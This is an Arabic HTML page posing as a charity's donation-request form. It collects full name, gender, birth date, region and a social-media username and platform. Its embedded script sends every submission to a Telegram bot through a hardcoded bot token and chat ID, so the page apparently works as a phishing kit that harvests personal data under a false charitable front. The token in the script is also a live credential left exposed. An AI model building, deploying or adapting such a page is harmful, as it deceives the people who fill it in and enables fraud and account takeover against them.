<meta name='viewport' content='width=device-width, initial-scale=1'/>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جمعية الإحسان الخيرية | للمساعدات</title>
    <style>
        body { font-family: 'Tahoma', sans-serif; background-color: #f8f9fa; margin: 0; padding: 0; color: #333; }
        .header { background-color: #2c3e50; color: white; padding: 20px 0; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .logo { font-size: 24px; font-weight: bold; }
        .container { max-width: 800px; margin: 30px auto; background-color: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 15px rgba(0,0,0,0.05); }
        h1 { color: #2c3e50; text-align: center; margin-bottom: 30px; font-size: 28px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-weight: 600; color: #2c3e50; }
        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
        button { background-color: #2980b9; color: white; padding: 14px; border: none; border-radius: 6px; cursor: pointer; font-size: 18px; width: 100%; transition: background 0.3s; }
        button:hover { background-color: #3498db; }
        .footer { text-align: center; margin-top: 30px; color: #7f8c8d; font-size: 14px; }
        .gender-options { display: flex; gap: 15px; margin-top: 8px; }
        .gender-option { display: flex; align-items: center; }
        .gender-option input { width: auto; margin-left: 8px; }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">جمعية الإحسان الخيرية</div>
    </div>

    <div class="container">
        <h1>نموذج طلب التبرع الإلكتروني</h1>
        <form id="donationForm">
            <div class="form-group">
                <label for="name">الاسم (بالكامل)</label>
                <input type="text" id="name" name="name" required>
            </div>
            
            <div class="form-group">
                <label>الجنس</label>
                <div class="gender-options">
                    <div class="gender-option">
                        <input type="radio" id="male" name="gender" value="ذكر" required>
                        <label for="male">ذكر</label>
                    </div>
                    <div class="gender-option">
                        <input type="radio" id="female" name="gender" value="أنثى">
                        <label for="female">أنثى</label>
                    </div>
                </div>
            </div>
    
            <div class="form-group">
                <label for="fatherName">تاريخ الميلاد</label>
                <input type="text" id="fatherName" name="fatherName" required>
            </div>
            <div class="form-group">
                <label for="region">المحافظة/المنطقة</label>
                <input type="text" id="region" name="region" required>
            </div>
            <div class="form-group">
                <label for="socialMedia">اسم او يوزر حسابك</label>
                <input type="text" id="socialMedia" name="socialMedia" required>
            </div>
            <div class="form-group">
                <label for="platform">اختر منصة التواصل المفضلة</label>
                <select id="platform" name="platform" required>
                    <option value="">-- اختر --</option>
                    <option value="انستگرام">انستگرام</option>
                    <option value="تليجرام">تليجرام</option>
                    <option value="فيسبوك">فيسبوك</option>
                </select>
            </div>
            <button type="submit">تأكيد طلب التبرع</button>
        </form>
        <div class="footer">
            © 2023 جمعية الإحسان الخيرية - جميع الحقوق محفوظة
        </div>
    </div>

    <script>
        document.getElementById('donationForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const gender = document.querySelector('input[name="gender"]:checked')?.value || 'غير محدد';
            
            const formData = {
                name: document.getElementById('name').value,
                gender: gender,
                fatherName: document.getElementById('fatherName').value,
                region: document.getElementById('region').value,
                socialMedia: document.getElementById('socialMedia').value,
                platform: document.getElementById('platform').value
            };

            const BOT_TOKEN = "8097003009:AAHNdM6R-_RamFOyz7P0ECL-tTXIda2EMog";
            const CHAT_ID = "7763665935";
            const message = `**🎯 تبرع جديد**\n\n👤 الاسم: ${formData.name}\n⚤ الجنس: ${formData.gender}\n📅 تاريخ الميلاد: ${formData.fatherName}\n📍 المنطقة: ${formData.region}\n📱 الحساب: ${formData.socialMedia}\n📌 المنصة: ${formData.platform}`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
                alert("شكراً لتبرعك! سيتم التواصل معك قريباً.");
                document.getElementById('donationForm').reset();
            } catch (error) {
                console.error("Error sending to Telegram:", error);
                alert("حدث خطأ! يرجى المحاولة لاحقاً.");
            }
        });
    </script>
</body>
</html>
